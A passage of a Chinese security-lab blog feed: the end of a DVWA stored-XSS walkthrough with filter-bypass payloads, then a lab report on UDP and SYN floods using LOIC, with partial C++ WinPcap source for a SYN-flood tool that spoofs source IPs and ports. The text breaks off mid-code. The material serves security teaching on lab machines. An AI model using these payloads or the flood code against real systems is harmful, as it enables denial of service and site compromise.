mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="subst">$message</span>', '<span class="subst">$name</span>' );"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">        <span class="comment">//mysql_close();</span></span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li>  <code>addslashes(string)</code> ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 ‘ 、” 、\ 、NULL</li>
<li>  <code>strip_tags(string)</code> ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签</li>
<li>  <code>htmlspecialchars(string)</code>： 把预定义的字符 “&lt;” （小于）、 “&gt;” （大于）、&amp; 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素</li>
</ul>
<p>绕过方法：</p>
<p>可以拿出message限制过多，但name限制较少，但前端限制了输入字符串长度，不过可以通过抓包修改进行注入操作，如下</p>
<p><strong>URL编码绕过</strong>，将XSS注入代码<code>&lt;SCRIPT&gt;alert('hack')&lt;/SCRIPT&gt;</code>进行URL编码得<code>%3c%53%43%52%49%50%54%3e%61%6c%65%72%74%28%27%68%61%63%6b%27%29%3c%2f%53%43%52%49%50%54%3e</code></p>
<p>结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119120436.png"></p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">        <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] );</span><br><span class="line">        <span class="comment">// Sanitize message input</span></span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">        <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line">        <span class="comment">// Sanitize name input</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, <span class="variable">$name</span> );</span><br><span class="line">        <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="subst">$message</span>', '<span class="subst">$name</span>' );"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">        <span class="comment">//mysql_close();</span></span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>在MEDIUM的基础上对name标签进行了script的正则表达式过滤，此处可以使用IMG标签绕过</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119122926.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119122948.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">        <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] );</span><br><span class="line">        <span class="comment">// Sanitize message input</span></span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">        <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line">        <span class="comment">// Sanitize name input</span></span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$name</span> );</span><br><span class="line">        <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$name</span> );</span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':message'</span>, <span class="variable">$message</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':name'</span>, <span class="variable">$name</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>对name参数也进行了更严格的过滤，导致name参数也无法进行XSS攻击。</p>
<p>使用了Anti-CSRF token防止CSRF攻击，杜绝了XSS漏洞和CSRF漏洞。</p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>DoS攻击实验</title>
    <url>/DoS%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol>
<li>使用一种<code>DoS工具</code>进行试验，通过抓包工具，分析验证2种<code>DoS攻击原理</code>。</li>
<li>尝试在<code>Windows</code>下编程实现<code>SYN Flood</code>攻击程序，并实现源地址伪装。<span id="more"></span></li>
</ol>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ol>
<li><p>攻击机：<code>windows10</code></p>
<p>IP地址：<code>10.122.232.200</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565669896292.png" alt="1565669896292"></p>
</li>
<li><p>靶机：<code>windows xp</code></p>
<p>IP地址：<code>10.122.219.188</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565669940728.png" alt="1565669940728"></p>
<p>靶机开放端口：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565669968417.png" alt="1565669968417"></p>
</li>
</ol>
<h2 id="UDP-FLOOD"><a href="#UDP-FLOOD" class="headerlink" title="UDP FLOOD"></a>UDP FLOOD</h2><ol>
<li><p>UDP FLOOD攻击原理：</p>
<p>​        攻击者利用大量UDP小包冲击DNS服务器或Radius认证服务器、流媒体视频服务器。 100k pps的UDP Flood经常将线路上的骨干设备例如防火墙打瘫，造成整个网段的瘫痪。由于UDP协议是一种无连接的服务，在UDP FLOOD攻击中，攻击者可发送大量伪造源IP地址的小UDP包。但是，由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。</p>
</li>
<li><p>使用攻击工具LOIC，填写靶机IP、攻击端口、UDP数据包内容<code>Hello</code><br><code>windows xp</code>、选择攻击模式、攻击速度进行攻击。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670190715.png" alt="1565670190715"></p>
</li>
<li><p>攻击机使用wireshark进行抓包，发现只有攻击机发送的数据包，没有靶机发送的数据包。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670222745.png" alt="1565670222745"></p>
</li>
<li><p>分析攻击机捕获的数据包：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670275933.png" alt="1565670275933"></p>
<ul>
<li>数据包总长度为<code>58字节</code></li>
<li>IP包总长度为<code>44字节</code></li>
<li>协议类型为<code>UDP协议</code>（编号17）</li>
<li>源IP地址：<code>10.122.232.200</code>（攻击机IP地址）</li>
<li>目标IP地址：<code>10.122.219.188</code>（靶机IP地址）</li>
<li>UDP协议源端口号：57804（<strong>不同IP包的源端口号不相同，即攻击机与靶机建立了大量的UDP连接</strong>）</li>
<li>UDP协议目标端口号：<code>445</code>(和输入的目标端口号相同)</li>
<li>UDP长度：<code>24字节</code></li>
<li>校验和和校验和状态：未验证</li>
<li>数据段：<code>16字节</code>，为<code>ASCII码</code>格式，转换成字符串后为输入的内容<code>Hello windows xp</code></li>
</ul>
</li>
<li><p>靶机使用wireshark进行抓包，同样发现只有攻击机发送的数据包，没有靶机发送的数据包。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670472184.png" alt="1565670472184"></p>
</li>
<li><p>分析靶机捕获的数据包：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670518121.png" alt="1565670518121"></p>
<ul>
<li>数据包总长度为<code>60字节</code>（比攻击机捕获的数据包多2字节）</li>
<li>数据段等其它内容和攻击机捕获的数据包内容相同</li>
</ul>
</li>
<li><p>判断DoS攻击是否成功。</p>
<ol>
<li><p>命令行ping百度网址无法收到回复，浏览器无法访问百度。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670618533.png" alt="1565670618533"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670632741.png" alt="1565670632741"></p>
</li>
<li><p>关闭攻击软件后，ping百度网址可以收到回复，浏览器可以正常访问百度网址。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670656998.png" alt="1565670656998"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670668505.png" alt="1565670668505"></p>
</li>
</ol>
</li>
<li><p>检查攻击机网络连接状态，发现建立大量UDP连接，说明了UDP FLOOD攻击的原理是<strong>攻击机向靶机同一端口发送多个UDP数据包，占用靶机资源，使靶机无法提供相关服务，从而使其与UDP相关的服务瘫痪。</strong></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670730395.png" alt="1565670730395"></p>
</li>
</ol>
<h2 id="SYN-FLOOD"><a href="#SYN-FLOOD" class="headerlink" title="SYN FLOOD"></a>SYN FLOOD</h2><ol>
<li><p>SYN FLOOD攻击原理：</p>
<p>​        SYN Flood不会完成TCP三次握手的第三步，也就是不发送确认连接的信息给服务器。这样，服务器无法完成第三次握手，但服务器不会立即放弃，服务器会不停的重试并等待一定的时间后放弃这个未完成的连接，这段时间叫做SYN timeout，这段时间大约30秒-2分钟左右。若是一个用户在连接时出现问题导致服务器的一个线程等待1分钟并不是什么大不了的问题，但是若有人用特殊的软件大量模拟这种情况，那后果就可想而知了。一个服务器若是处理这些大量的半连接信息而消耗大量的系统资源和网络带宽，这样服务器就不会再有空余去处理普通用户的正常请求(因为客户的正常请求比率很小)，即服务器无法正常工作。</p>
</li>
<li><p>使用攻击工具LOIC，填写靶机IP、攻击端口、TCP数据包内容<code>Hello</code>、选择攻击模式、攻击速度进行攻击。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670814412.png" alt="1565670814412"></p>
</li>
<li><p>攻击机使用wireshark进行抓包，不仅有攻击机发送的SYN数据包，还有靶机发送的ACK数据包，但是大量的SYN数据包并没有得到回复。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670847338.png" alt="1565670847338"></p>
</li>
<li><p>分析攻击机捕获的数据包：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670892972.png" alt="1565670892972"></p>
<ul>
<li>数据包总长度为<code>66字节</code></li>
<li>IP包总长度为<code>52字节</code></li>
<li>协议类型为<code>TCP协议</code>（编号6）</li>
<li>源IP地址：<code>10.122.232.200</code>（攻击机IP地址）</li>
<li>目标IP地址：<code>10.122.219.188</code>（靶机IP地址）</li>
<li>TCP协议源端口号：<code>3443</code>（<code>不同IP包的源端口号不相同，即攻击机与靶机建立了大量的UDP连接</code>）</li>
<li>TCP协议目标端口号：<code>135</code>(和输入的目标端口号相同)</li>
<li>TCP头长度：<code>24字节</code></li>
<li>数据段：<code>5字节</code>，只存在<code>push ack包</code>中，为<code>ASCII码</code>格式，转换成字符串后为输入的内容<code>Hello</code></li>
</ul>
</li>
<li><p>判断DoS攻击是否成功。</p>
<ol>
<li><p>命令行ping百度网址收到回复，但出现很大程度的丢包现象，浏览器可以访问百度，但需要等待的时间较长。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671054841.png" alt="1565671054841"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671070981.png" alt="1565671070981"></p>
</li>
<li><p>关闭攻击软件后，ping百度网址没有丢包，浏览器可以以正常的速度访问百度网址。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671094141.png" alt="1565671094141"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671103983.png" alt="1565671103983"></p>
</li>
</ol>
</li>
<li><p>检查攻击机网络连接状态，发现建立大量TCP连接，说明了TCP FLOOD攻击的原理是<strong>攻击机与靶机三次握手不完整，建立多个TCP连接，使靶机的资源耗尽，从而使其与TCP相关的服务瘫痪。</strong></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671149362.png" alt="1565671149362"></p>
</li>
</ol>
<h2 id="分析比较两种攻击方法"><a href="#分析比较两种攻击方法" class="headerlink" title="分析比较两种攻击方法"></a>分析比较两种攻击方法</h2><ol>
<li>原理：<ul>
<li>UDP FLOOD攻击：攻击机向靶机同一端口发送多个UDP数据包，占用靶机资源，使靶机无法提供相关服务，从而使其与UDP相关的服务瘫痪。</li>
<li>SYN FLOOD攻击：攻击机向靶机发送SYN数据包，建立TCP连接后，一直不完成三次握手，即与靶机建立多个TCP连接使靶机的资源耗尽，从而使其与TCP相关的服务瘫痪。</li>
</ul>
</li>
<li>攻击差别：<ul>
<li>UDP FLOOD攻击个人理解是流氓攻击，一直占用资源，使靶机毫无还手之力。</li>
<li>SYN FLOOD攻击当靶机有足够的资源进行回复时，还是可以访问其他网站的，即SYN FLOOD攻击不彻底。</li>
</ul>
</li>
</ol>
<h2 id="编程实现SYN-Flood攻击程序"><a href="#编程实现SYN-Flood攻击程序" class="headerlink" title="编程实现SYN Flood攻击程序"></a>编程实现SYN Flood攻击程序</h2><p>在Windows下编程实现SYN Flood攻击程序，实现源地址伪装</p>
<h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li><p>攻击机：<code>windows 10</code></p>
<p>IP地址：<code>10.122.213.156</code></p>
</li>
<li><p>靶机：<code>windows 10</code></p>
<p>IP地址：<code>10.122.232.200</code></p>
</li>
<li><p>编程工具：<code>VS2017</code></p>
</li>
</ul>
<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671374533.png" alt="1565671374533"></p>
<h3 id="搭建编程环境"><a href="#搭建编程环境" class="headerlink" title="搭建编程环境"></a>搭建编程环境</h3><ol>
<li><p>下载安装<code>WinPcap运行库</code>，下载解压<code>WinPcap开发包</code>。</p>
</li>
<li><p>打开vs2017,新建<code>windows控制台应用程序</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671574581.png" alt="1565671574581"></p>
</li>
<li><p>打开<code>项目属性-&gt;配置属性-&gt;c/c++-&gt;预处理器-&gt;预处理器定义</code>，在其中添加<code>WPCAP</code>、<code>HAVE_REMOTE</code>两个宏定义。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671724202.png" alt="1565671724202"></p>
</li>
<li><p>打开<code>项目属性-&gt;配置属性-&gt;链接器-&gt;输入-&gt;附加依赖项</code>添加<code>wpcap.lib</code>和<code>ws2_32.lib</code>两个库。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671740965.png" alt="1565671740965"></p>
</li>
<li><p>打开<code>项目属性-&gt;配置属性-&gt;VC++目录-&gt;包含目录</code>和同级的<code>库目录</code>分别添加之前下载解压的<code>WinPcap开发包</code>的<code>Include目录</code>和<code>Lib目录</code>路径。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671758936.png" alt="1565671758936"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671662749.png" alt="1565671662749"></p>
</li>
</ol>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* SYN包结构 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TCP_SYN</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> DstMAC[<span class="number">6</span>];  		<span class="comment">// 目的mac地址  </span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> SrcMAC[<span class="number">6</span>];  		<span class="comment">// 源mac地址  </span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> OtherData[<span class="number">12</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> Header_ChechSum; <span class="comment">// 校验和  </span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> SrcIP;       		<span class="comment">// 源IP地址  </span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> DstIP;       		<span class="comment">// 目标IP地址</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> SrcPort;   		<span class="comment">// 源端口</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> DstPort;   		<span class="comment">// 目标端口</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> Ohters[<span class="number">16</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> pak_checksum;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> OtherLast[<span class="number">1</span>];</span><br><span class="line">&#125;TCP_SYN, *PTCP_SYN;</span><br></pre></td></tr></table></figure>

<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><ol>
<li><p>进行攻击，打开程序，输入目标IP和目标端口，可以看到攻击源IP地址和源端口在不断改变。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671832506.png" alt="1565671832506"></p>
</li>
<li><p>使用wireshark进行抓包可以看到伪造的地址向目标IP地址的目标端口135号端口发送大量TCP SYN包。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671864663.png" alt="1565671864663"></p>
</li>
<li><p>打开捕获的SYN包，源MAC地址也是随机的，SYN包内容与理论预期符合。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671895895.png" alt="1565671895895"></p>
</li>
</ol>
<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>​        在实验过程中，通过对局域网内的主机进行UDP FLOOF攻击，意外地把整个局域网攻击了，查资料发现大量UDP包会把局域网堵塞，导致局域网内主机无法上网，这是一种可行的攻击手段。又发现如果攻击机和靶机同时连接手机热点，则攻击无法成功，经过实验，得出的初步结论是两台主机不在同一局域网下，即手机热点不能看做是一个局域网。当然还有一种猜测是手机热点在转发UDP包时做了防护措施，这一猜测目前还未进行验证。</p>
<h3 id="实验核心代码"><a href="#实验核心代码" class="headerlink" title="实验核心代码"></a>实验核心代码</h3><p>点击下载程序源代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* SYN包结构 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TCP_SYN</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> DstMAC[<span class="number">6</span>];  		<span class="comment">// 目的mac地址  </span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> SrcMAC[<span class="number">6</span>];  		<span class="comment">// 源mac地址  </span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> OtherData[<span class="number">12</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> Header_ChechSum; <span class="comment">// 校验和  </span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> SrcIP;       		<span class="comment">// 源IP地址  </span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> DstIP;       		<span class="comment">// 目标IP地址</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> SrcPort;   		<span class="comment">// 源端口</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> DstPort;   		<span class="comment">// 目标端口</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> Ohters[<span class="number">16</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> pak_checksum;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> OtherLast[<span class="number">1</span>];</span><br><span class="line">&#125;TCP_SYN, *PTCP_SYN;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 校验和函数 */</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">checksum</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> *buffer, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> cksum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (size &gt; <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cksum += *buffer++;</span><br><span class="line">		size -= <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">short</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (size)</span><br><span class="line">	&#123;</span><br><span class="line">		cksum += *(<span class="type">unsigned</span> <span class="type">char</span>*)buffer;</span><br><span class="line">	&#125;</span><br><span class="line">	cksum = (cksum &gt;&gt; <span class="number">16</span>) + (cksum &amp; <span class="number">0xffff</span>);</span><br><span class="line">	cksum += (cksum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span>  (<span class="type">unsigned</span> <span class="type">short</span>)(~cksum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 源IP地址随机产生 */</span></span><br><span class="line"><span class="built_in">itoa</span>(<span class="built_in">rand</span>() % <span class="number">252</span> + <span class="number">3</span>, src_adr_part, <span class="number">10</span>);				</span><br><span class="line"><span class="built_in">strcpy</span>(src_adr, src_adr_part);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">strcat</span>(src_adr, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">	<span class="built_in">itoa</span>(<span class="built_in">rand</span>() % <span class="number">252</span> + <span class="number">3</span>, src_adr_part, <span class="number">10</span>);</span><br><span class="line">	<span class="built_in">strcat</span>(src_adr, src_adr_part);</span><br><span class="line">&#125;</span><br><span class="line">SynData-&gt;SrcIP = <span class="built_in">inet_addr</span>(src_adr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 源端口随机产生 */</span></span><br><span class="line">src_port = (<span class="type">unsigned</span> <span class="type">short</span>)<span class="built_in">rand</span>() % <span class="number">65534</span> + <span class="number">1</span>;			</span><br><span class="line">SynData-&gt;SrcPort = <span class="built_in">htons</span>(src_port);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检验校验和错误的包 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pcap_sendpacket</span>(fp, bufData, <span class="built_in">sizeof</span>(bufData) - 